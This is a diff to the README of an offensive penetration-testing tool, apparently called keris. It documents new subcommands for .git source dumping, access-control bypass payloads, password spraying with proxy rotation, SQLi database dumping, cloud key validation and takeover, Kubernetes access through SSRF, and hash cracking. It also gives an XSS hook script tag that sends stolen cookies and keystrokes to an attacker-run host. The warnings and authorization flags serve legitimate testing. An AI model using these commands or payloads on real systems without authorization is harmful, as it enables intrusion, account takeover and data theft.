@@ -38,8 +38,9 @@ wordlists, credential validation against a live login, credential hunting
   system without permission is illegal in almost every jurisdiction.
 - A red warning banner is printed before every aggressive mode (`--pwn`,
   `--exploit`, `--brute-extended`, `dos --hammer`, `hunt --verify`,
-  `credcheck`, `exploit`, `shell`, `pivot`, `rebind`). It is a reminder that
-  all risk stays with you.
+  `credcheck`, `exploit`, `shell`, `pivot`, `rebind`, `gitdump`,
+  `authbypass`, `spray`, `dbdump`, `cloud`, `xsshook`, `k8s`, `crack`). It
+  is a reminder that all risk stays with you.
 - Never use this for cybercrime. Legality and responsibility sit with the
   operator, not the tool.
 
@@ -100,7 +101,7 @@ never expose it publicly.
 
 ## Commands
 
-38+ subcommands. The ones you'll reach for most:
+46+ subcommands. The ones you'll reach for most:
 
 | Command | What it does |
 |---|---|
@@ -127,6 +128,14 @@ never expose it publicly.
 | `shell` | Reverse-shell payload generator (bash/python/powershell + URL/base64 variants) + read-only RCE proof (authorized only) |
 | `pivot` | SOCKS5 proxy pivoting through a confirmed SSRF endpoint (authorized + `--yes` only) |
 | `rebind` | DNS rebinding server to bypass SSRF allowlists (authorized + `--yes` only) |
+| `gitdump` | Full `.git` dump: download objects + rebuild source code from a public repo (authorized only) |
+| `authbypass` | Access-control bypass tests: verb tampering, path normalization, role-param pollution, header spoofing (authorized only) |
+| `spray` | Anti-lockout password spraying: one password per account with delay + proxy rotation (authorized only) |
+| `dbdump` | Full database dump from a confirmed UNION-based SQLi: tables, rows, schema (authorized only) |
+| `cloud` | Cloud takeover checks: live AWS key verification, dangling S3 buckets, GCP service accounts, Azure tenants (authorized only) |
+| `xsshook` | XSS hook server (cookie/keylog/DOM capture) to prove impact of a stored XSS (authorized + `--yes` only) |
+| `k8s` | Kubernetes API enumeration & access test: direct or pivoted through an SSRF (authorized only) |
+| `crack` | Offline hash cracking: MD5/SHA1/SHA256/NTLM/MD5-Crypt via wordlist or short brute (authorized only) |
 | `plugins` / `init` | Your own custom checks; generate an example `keris.json` |
 
 Every full scan includes by default: SQLi, XSS, SSRF, IDOR, rate-limit,
@@ -386,6 +395,119 @@ keris rebind --domain rebind.example.com --target-ip 169.254.169.254 --authorize
 
 Also requires `--authorized --yes` (a DNS server on port 53 needs privileges;
 bind to 127.0.0.1 for local labs).
+
+### `.git` dump & source recovery (`gitdump`)
+
+When `/.git/` is publicly readable, downloads the index, then every blob
+object (`/.git/objects/xx/rest`), decompresses them and reconstructs the
+committed source tree — including secrets that were ever committed:
+
+```bash
+keris gitdump https://example.com --authorized --outdir ./source-dump
+```
+
+- Parses the git index (`DIRC` v2) to map blob SHA1s to file paths.
+- Falls back to `/objects/pack/*.idx`+`*.pack` when loose objects are blocked.
+- Writes recovered files under `./.gitdump-<host>/source/`.
+
+### Auth bypass engine (`authbypass`)
+
+Systematically probes access-control bypasses against protected endpoints:
+
+```bash
+keris authbypass https://example.com --endpoint /admin --authorized
+```
+
+- **Verb tampering** — `GET/POST/PUT/PATCH/OPTIONS/HEAD/TRACE` on the same URL.
+- **Path normalization** — `//admin`, `/./admin`, `/admin/..;/admin`, trailing
+  dot/semicolon/mixed-case variants.
+- **Role-param pollution** — `?admin=true`, `?role=admin`, `X-Forwarded-For`,
+  `X-Original-URL` header spoofing.
+
+### Password spraying (`spray`)
+
+Anti-lockout login guessing — one password per account with a delay, optional
+proxy rotation, and automatic stop on rate-limit/lockout markers:
+
+```bash
+keris spray https://example.com --users a,b,c --passwords Spring2026! --authorized
+keris spray https://example.com --users-file users.txt --proxy-file proxies.txt --spray-delay 1.5 --authorized
+```
+
+Detects form/basic/JSON login flows automatically (`--auth-type` to pin it).
+
+### Full database dump (`dbdump`)
+
+From a confirmed UNION-based SQLi, extracts the full schema and row data with
+parallel workers and resumable checkpoints:
+
+```bash
+keris dbdump https://example.com --vuln-url "http://host/search?id=1" --vuln-param id --authorized
+```
+
+Auto-detects the DB engine and column count, enumerates tables, then dumps
+each table's rows into `<outdir>/<table>.csv` (SQLite output reopens with
+`sqlite3` for easy inspection).
+
+### Cloud takeover (`cloud`)
+
+Verifies leaked cloud credentials and finds dangling resources that can be
+taken over:
+
+```bash
+keris cloud https://example.com --from-scan report.json --authorized
+keris cloud https://example.com --bucket legacy-assets --authorized
+```
+
+- **AWS** — validates access keys against STS `GetCallerIdentity` (live check),
+  flags expired/denied keys.
+- **S3/GCS** — dangling bucket names (`NoSuchBucket` → subdomain takeover).
+- **GCP / Azure** — identifies service-account emails and tenant IDs leaked in
+  responses.
+
+### XSS hook / C2 capture (`xsshook`)
+
+Starts a capture server that stores the cookie, keylog, and DOM snapshot your
+`hook.js` beacon sends back — turning a "reflected" XSS finding into proof of
+impact:
+
+```bash
+keris xsshook --bind 0.0.0.0 --port 9999 --authorized --yes
+# lalu:
+#   <script src=http://YOUR_IP:9999/hook.js></script>
+```
+
+Needs `--authorized --yes` and keeps running until Ctrl+C. Sensitive
+connection handlers return the **shell command to remove** the capture files —
+never leave captured cookies on disk after a test.
+
+### Kubernetes attack (`k8s`)
+
+Enumerates a Kubernetes API server and tests anonymous access — directly, or
+pivoted through a confirmed SSRF:
+
+```bash
+keris k8s https://k8s.example.com --authorized            # direct API
+keris k8s https://app.example.com --ssrf-url "http://app/fetch?u=1" --ssrf-param u --authorized  # via SSRF
+```
+
+Checks `/version`, `/api/v1`, `/api/v1/namespaces`, RBAC via
+`/apis/rbac.authorization.k8s.io` and flags any endpoint answering without
+authentication.
+
+### Hash cracking (`crack`)
+
+Offline hash cracking with a built-in wordlist, custom wordlists, or short
+brute-force (MD5/SHA1/SHA256/NTLM/MD5-Crypt; NTLM uses a pure-Python MD4 so it
+works even where OpenSSL omits `md4`):
+
+```bash
+keris crack --hash 5f4dcc3b5aa765d61d8327deb882cf99 --authorized
+keris crack --hashes-file hashes.txt --wordlist rockyou.txt --authorized
+```
+
+Pure local computation — no network traffic. Output is JSON-friendly for
+feeding back into a report.
 
 ### SSRF detection & exploitation (`--ssrf` / `--ssrf-exploit`)
 
